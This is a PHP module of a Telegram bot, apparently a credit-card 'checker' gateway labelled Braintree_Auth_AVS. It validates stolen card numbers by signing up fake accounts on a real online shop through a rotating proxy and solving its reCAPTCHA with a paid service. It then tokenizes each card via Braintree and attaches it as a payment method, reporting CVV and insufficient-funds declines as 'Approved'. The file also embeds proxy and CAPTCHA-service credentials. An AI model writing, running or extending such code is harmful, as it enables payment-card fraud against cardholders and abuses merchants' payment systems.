<?php

require __DIR__ . "/../Class/Capsolver/autoload.php";


$gatewayname="be";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#Braintree_Auth_AVS (".'$be'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($year) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    

 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    $lastFourDigits = substr($cc, -4);
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
 $socks5 = "gw.dataimpulse.com:823";
 $rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";
 
 $cookie = uniqid();
 
 
 $proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 $response = CurlX::Get(
    "https://boltlaundry.com/register/",
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'referer: https://boltlaundry.com/my-account/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$nonce=CurlX::ParseString($response->body,'name="ihc_user_add_edit_nonce"  class="" value="','"');
$solver = new \Capsolver\CapsolverClient('CAP-0DC8A5669BCC3BACE0A04D2AA3C14585');
// Máximo número de intentos
$maxRetries = 3;
$attempt = 0;
$captcha = null;

while ($attempt < $maxRetries) {
    try {
        $attempt++;

        echo "Intento $attempt de $maxRetries...\n";

        // Crear tarea y obtener solución
        $solution = $solver->recaptchav2(
            \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
            [
                'websiteURL' => 'https://boltlaundry.com',
                'websiteKey' => '6LfNFPopAAAAALDo0D3lbOGc_1GZBAt-8QSQSain',
            ]
        );

        // Verificar si hay una solución válida
        if (isset($solution["gRecaptchaResponse"])) {
            $captcha = $solution["gRecaptchaResponse"];
            echo "Captcha resuelto exitosamente: $captcha\n";
            break; // Salir del bucle si se resuelve el captcha
        } else {
            throw new Exception("No se recibió una solución válida del servidor.");
        }

    } catch (\Exception $e) {
        // Registrar el error
        error_log("Error al resolver el captcha (Intento $attempt): " . $e->getMessage());
        echo "Ocurrió un error al resolver el captcha: " . $e->getMessage() . "\n";

        // Si alcanzamos el límite de intentos, mostrar mensaje de error
        if ($attempt >= $maxRetries) {
            echo "No se pudo resolver el captcha después de $maxRetries intentos. Intente nuevamente más tarde.\n";
            $bot->callApi('EditMessageText', [
                'chat_id' => $chat_id,
                'text' => sprintf(
                    $bot->translateTemplate($messages['gateway'], 'en', $lang),
                    $gateway,
                    $creditcard,
                    $bot->translateText("Declined!❌", "en", $lang),
                    $bot->translateText("maximo de reintentos", "es", $lang)." $maxRetries",
                    "$type - $level",
                    $bank,
                    "$country_name$country_flag",
                    $starttime,
                    $username ?: $firstname
                ),
                'parse_mode' => 'html',
                'message_id' => $editmessage,
                'reply_markup' => json_encode([
                    'inline_keyboard' => $messages['buttons_gateways'],
                    'resize_keyboard' => true
             
                    ])
                ]);
            break;
        }

        // Opcional: Esperar un momento antes de reintentar
        sleep(2);
    }
}

$response = CurlX::Post(
    "https://boltlaundry.com/register/",
    '------WebKitFormBoundaryVXB35iPA7GjSAUOP
Content-Disposition: form-data; name="user_login"

'.$email.'
------WebKitFormBoundaryVXB35iPA7GjSAUOP
Content-Disposition: form-data; name="user_email"

'.$email.'
------WebKitFormBoundaryVXB35iPA7GjSAUOP
Content-Disposition: form-data; name="pass1"

Frange0303@
------WebKitFormBoundaryVXB35iPA7GjSAUOP
Content-Disposition: form-data; name="tos"

1
------WebKitFormBoundaryVXB35iPA7GjSAUOP
Content-Disposition: form-data; name="g-recaptcha-response"

'.$captcha.'
------WebKitFormBoundaryVXB35iPA7GjSAUOP
Content-Disposition: form-data; name="ihcFormType"

register
------WebKitFormBoundaryVXB35iPA7GjSAUOP
Content-Disposition: form-data; name="ihcaction"

register
------WebKitFormBoundaryVXB35iPA7GjSAUOP
Content-Disposition: form-data; name="ihc_user_add_edit_nonce"

'.$nonce.'
------WebKitFormBoundaryVXB35iPA7GjSAUOP--',
    [
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: multipart/form-data; boundary=----WebKitFormBoundaryVXB35iPA7GjSAUOP',
        'origin: https://boltlaundry.com',
        'priority: u=0, i',
        'referer: https://boltlaundry.com/register/',
        'sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: same-origin',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$noncelogin=CurlX::ParseString($response->body,'name="ihc_login_nonce" value="','"');
$response = CurlX::Post(
    "https://boltlaundry.com/login/",
    'ihcaction=login&ihc_login_nonce='.$noncelogin.'&log='.urlencode($email).'&pwd=Frange0303%40',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'content-type: application/x-www-form-urlencoded',
        'referer: https://boltlaundry.com/login/'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Get(
    "https://boltlaundry.com/my-account/edit-address/billing/",
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'referer: https://boltlaundry.com/my-account/edit-address/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$nonceEdit=CurlX::ParseString($response->body,' name="woocommerce-edit-address-nonce" value="','"');


$response = CurlX::Post(
    "https://boltlaundry.com/my-account/edit-address/billing/",
    'billing_first_name=Angel&billing_last_name=Lopes&billing_company=revenge&billing_country=US&billing_address_1=Street+Avenue+3xxx&billing_address_2=&billing_city=BELCONNEN+DC&billing_state=NY&billing_postcode=10080&billing_phone=4241585&billing_email='.$email.'&save_address=Save+address&woocommerce-edit-address-nonce='.$nonceEdit.'&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'referer: https://boltlaundry.com/my-account/edit-address/billing/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$response = CurlX::Get(
    "https://boltlaundry.com/my-account/add-payment-method/",
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'referer: https://boltlaundry.com/my-account/add-payment-method/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
 $nonceAdd=CurlX::ParseString($response->body,' name="woocommerce-add-payment-method-nonce" value="','"');
 $token_nonce=CurlX::ParseString($response->body,'"client_token_nonce":"','"');


$response = CurlX::Post(
    "https://boltlaundry.com/wp-admin/admin-ajax.php",
    'action=wc_braintree_credit_card_get_client_token&nonce='.$token_nonce.'',
    [
        'accept: */*',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'referer: https://boltlaundry.com/my-account/add-payment-method/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-requested-with: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);

$data = json_decode($response->body, true);

$bearer = $data['data'];
 $bearer = json_decode(base64_decode($bearer),true)["authorizationFingerprint"];


$response = CurlX::Post(
    "https://payments.braintree-api.com/graphql",
    '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"c7977ccb-8954-4f82-934a-b37c49c0896d"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
    [
        'accept: */*',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'authorization: Bearer '.$bearer.'',
        'braintree-version: 2018-05-10',
        'content-type: application/json',
        'referer: https://assets.braintreegateway.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$token =CurlX::ParseString($response->body,'"token":"','"');
$response = CurlX::Post(
    "https://boltlaundry.com/my-account/add-payment-method/",
    'payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce='.$token.'&wc_braintree_device_data=&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce='.$nonceAdd.'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/x-www-form-urlencoded',
        'referer: https://boltlaundry.com/my-account/add-payment-method/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);



 //==================[Manejo de los mensajes]======================//
$errormessage=trim(CurlX::ParseString($response->body,'<span class="message-icon icon-close"></span>','<'));

if($errormessage=="null"){
    $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
} 

 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 if(strpos($response->body,"Payment method successfully added.")){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved", "en", $lang)." Auth✅",
            "Payment method successfully added.",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code 2001: Insufficient Funds (51 : DECLINED)"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
           $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code avs_and_cvv: Gateway Rejected: avs_and_cvv"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code 2010: Card Issuer Declined CVV"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
        $errormessage,
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
